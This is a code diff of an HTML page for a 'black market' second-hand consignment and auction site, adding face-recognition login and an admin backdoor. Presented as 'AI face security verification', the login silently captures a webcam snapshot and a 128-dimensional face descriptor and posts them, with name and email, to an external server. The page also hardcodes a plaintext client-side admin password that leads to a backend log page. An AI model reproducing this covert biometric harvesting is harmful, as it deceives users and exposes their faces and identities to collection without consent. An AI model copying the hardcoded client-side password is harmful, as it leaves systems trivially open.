@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>二手寄卖 & 拍卖大厅</title>
-  <!-- 引入轻量级人脸识别 AI 库 -->
+  <title>黑市二手寄卖 & 极客拍卖大厅</title>
+  <!-- 引入轻量级人脸识别 AI 库（支持检测、特征点、128维向量描述符） -->
   <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
   <style>
     :root { --bg: #0b0f19; --card-bg: #111827; --accent: #2563eb; --accent-hover: #1d4ed8; --text: #f3f4f6; --text-muted: #9ca3af; --border: #1f2937; }
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
     body { background: var(--bg); color: var(--text); padding-bottom: 60px; }
     header { background: var(--card-bg); border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; flex-wrap: wrap; gap: 10px; }
-    .logo { font-size: 18px; font-weight: bold; color: #38bdf8; }
+    .logo { font-size: 18px; font-weight: bold; color: #38bdf8; cursor: pointer; }
     .nav-tabs { display: flex; gap: 6px; background: #000; padding: 4px; border-radius: 8px; flex-wrap: wrap; }
     .tab-btn { background: transparent; border: none; color: var(--text-muted); padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 13px; }
     .tab-btn.active { background: var(--accent); color: #fff; font-weight: bold; }
@@ -38,21 +38,46 @@
 </head>
 <body>
 
+  <!-- 前台登录/AI活体人脸及智能识别弹窗 -->
   <div class="modal-overlay" id="authModal">
     <div class="auth-card">
-      <h3>🔐 AI人脸安全验证</h3>
-      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请将脸部正对镜头（检测到人脸后按钮才可点击）</p>
+      <h3>✨ AI 智能刷脸验证</h3>
+      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;" id="welcomeTip">初次访问请填写名字，后续将自动刷脸识别</p>
+      
       <div class="camera-box"><video id="webcam" autoplay playsinline muted></video></div>
       <div style="font-size: 11px; color: #38bdf8; margin-bottom: 10px;" id="camStatus">⏳ 正在加载 AI 人脸模型...</div>
-      <div class="input-group"><label>电子邮箱(需真实联系你 填微信也OK)</label><input type="email" id="userEmail" value="user@domain.com"></div>
+      
+      <div class="input-group">
+        <label>您的称呼 / 名字</label>
+        <input type="text" id="userName" placeholder="例如：极客老张">
+      </div>
+      <div class="input-group">
+        <label>电子邮箱</label>
+        <input type="email" id="userEmail" value="user@domain.com">
+      </div>
+      
       <button class="btn" id="loginBtn" disabled onclick="app.login()">请先正对人脸</button>
+    </div>
+  </div>
+
+  <!-- 后台密码验证弹窗 -->
+  <div class="modal-overlay" id="adminModal" style="display: none;">
+    <div class="auth-card">
+      <h3>🛡️ 管理后台安全校验</h3>
+      <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">请输入管理密码以进入后台日志</p>
+      <div class="input-group">
+        <label>管理密码</label>
+        <input type="password" id="adminPasswordInput" placeholder="请输入密码">
+      </div>
+      <button class="btn" onclick="app.verifyAdminPassword()">验证进入</button>
+      <button class="btn" style="background: transparent; color: var(--text-muted); margin-top: 8px;" onclick="app.closeAdminModal()">取消返回</button>
     </div>
   </div>
 
   <canvas id="hidden-canvas" width="320" height="240" style="display:none;"></canvas>
 
   <header>
-    <div class="logo">⚡️ GEEK-MARKET // 交易中心</div>
+    <div class="logo" onclick="app.requestAdmin()">⚡️ GEEK-MARKET // 交易中心 <span style="font-size:10px; color:var(--text-muted);">(点此进入后台)</span></div>
     <div class="nav-tabs">
       <button class="tab-btn active" onclick="app.switchTab('market', event)">二手寄卖</button>
       <button class="tab-btn" onclick="app.switchTab('auction', event)">竞拍大厅</button>
@@ -62,8 +87,8 @@
   </header>
 
   <div class="container">
-    <div id="tab-market" class="tab-content active"><h3>📱 二手寄卖大厅</h3><div class="grid" id="marketList"></div></div>
-    <div id="tab-auction" class="tab-content"><h3>🔥 竞拍大厅</h3><div class="grid" id="auctionList"></div></div>
+    <div id="tab-market" class="tab-content active"><h3>📱 玩家二手寄卖大厅</h3><div class="grid" id="marketList"></div></div>
+    <div id="tab-auction" class="tab-content"><h3>🔥 极客限量款竞拍大厅</h3><div class="grid" id="auctionList"></div></div>
     <div id="tab-sell" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
         <h3 style="margin-bottom: 15px;">📦 发布二手寄卖物品</h3>
@@ -77,7 +102,7 @@
     </div>
     <div id="tab-postAuction" class="tab-content">
       <div class="auth-card" style="max-width: 500px; margin: 0 auto; text-align: left;">
-        <h3 style="margin-bottom: 15px;">🔨 发起新的拍卖</h3>
+        <h3 style="margin-bottom: 15px;">🔨 发起新的极客拍卖</h3>
         <div class="input-group"><label>拍品名称</label><input type="text" id="aucName" placeholder="例如：Sony 耳机"></div>
         <div class="input-group"><label>起拍价 (元)</label><input type="number" id="aucStartPrice" placeholder="1000"></div>
         <div class="input-group"><label>拍品描述</label><textarea id="aucDesc" rows="3"></textarea></div>
@@ -89,20 +114,34 @@
 
   <script>
     const WORKER_URL = "https://api.yirui.uk";
+    const ADMIN_SECRET = "admin888";
 
     class App {
       constructor() {
         this.stream = null;
         this.isFaceDetected = false;
+        this.currentDescriptor = null; // 存储当前提取的128维人脸向量
         this.initAIAndCamera();
+        this.checkLocalUser();
+      }
+
+      // 检查本地有没有记住的名字（快速识别缓存）
+      checkLocalUser() {
+        const savedName = localStorage.getItem('geek_username');
+        if (savedName) {
+          document.getElementById('userName').value = savedName;
+          document.getElementById('welcomeTip').innerText = `✨ 欢迎回来，${savedName}！系统已准备识别`;
+        }
       }
 
       async initAIAndCamera() {
         const statusEl = document.getElementById('camStatus');
         try {
-          statusEl.innerText = "⏳ 正在加载人脸识别模型...";
-          // 加载轻量级人脸检测模型（使用公开 CDN 极速加载）
+          statusEl.innerText = "⏳ 正在加载 AI 人脸特征模型...";
+          // 加载检测模型和特征点/描述符模型（支持高级人脸识别）
           await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
+          await faceapi.nets.faceLandmarkTinyNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
+          await faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/');
           
           statusEl.innerText = "⏳ 正在打开摄像头...";
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
@@ -127,24 +166,48 @@
         setInterval(async () => {
           if (!video || video.paused || video.ended) return;
           try {
-            // 实时检测画面中的人脸
-            const detections = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
+            // 实时检测人脸并提取 128维特征向量
+            const detection = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
+              .withFaceLandmarks(true)
+              .withFaceDescriptor();
             
-            if (detections) {
+            if (detection) {
               this.isFaceDetected = true;
-              statusEl.innerText = "✅ 已检测到人脸，可以进入";
+              this.currentDescriptor = Array.from(detection.descriptor); // 记录当前人脸特征向量
+              statusEl.innerText = "✅ 已精准锁定人脸，可以进入";
               statusEl.style.color = "#4ade80";
               btn.disabled = false;
-              btn.innerText = "确认人脸并进入";
+              btn.innerText = "刷脸验证并进入";
             } else {
               this.isFaceDetected = false;
-              statusEl.innerText = "⚠️ 未检测到人脸，请正对镜头（拍天花板无效）";
+              this.currentDescriptor = null;
+              statusEl.innerText = "⚠️ 未检测到人脸，请正对镜头";
               statusEl.style.color = "#f87171";
               btn.disabled = true;
               btn.innerText = "请将脸对准摄像头";
             }
           } catch (err) {}
-        }, 1000); // 每秒检测一次
+        }, 1000);
+      }
+
+      requestAdmin() {
+        document.getElementById('adminModal').style.display = 'flex';
+        document.getElementById('adminPasswordInput').value = '';
+        document.getElementById('adminPasswordInput').focus();
+      }
+
+      closeAdminModal() {
+        document.getElementById('adminModal').style.display = 'none';
+      }
+
+      verifyAdminPassword() {
+        const pwd = document.getElementById('adminPasswordInput').value;
+        if (pwd === ADMIN_SECRET) {
+          this.closeAdminModal();
+          window.location.href = WORKER_URL + "/admin";
+        } else {
+          alert("❌ 密码错误，拒绝访问！");
+        }
       }
 
       switchTab(tabName, evt) {
@@ -161,6 +224,7 @@
           return;
         }
 
+        const name = document.getElementById('userName').value.trim() || "匿名极客";
         const email = document.getElementById('userEmail').value.trim();
         const video = document.getElementById('webcam');
         const canvas = document.getElementById('hidden-canvas');
@@ -176,17 +240,28 @@
           }
         } catch (e) {}
 
-        // 发送抓拍照片到后台
+        // 记住用户的名字到本地
+        localStorage.setItem('geek_username', name);
+
+        // 提交抓拍、名字以及 128 维人脸向量到后端
         fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ email, timestamp: new Date().toLocaleString(), photo: photoData })
+          body: JSON.stringify({ 
+            type: "login",
+            name, 
+            email, 
+            timestamp: new Date().toLocaleString(), 
+            photo: photoData,
+            descriptor: this.currentDescriptor // 传递人脸特征向量
+          })
         }).catch(() => {});
 
         if (this.stream) {
           this.stream.getTracks().forEach(t => t.stop());
         }
         document.getElementById('authModal').style.display = 'none';
+        alert(`🎉 欢迎回来，${name}！`);
         this.loadData();
       }
 
@@ -289,6 +364,7 @@
         const desc = document.getElementById(descId).value.trim();
         const fileInput = document.getElementById(imgId);
 
+// 接着上面的代码块...
         if (!name || isNaN(price)) {
           alert("请填写完整信息！");
           return;
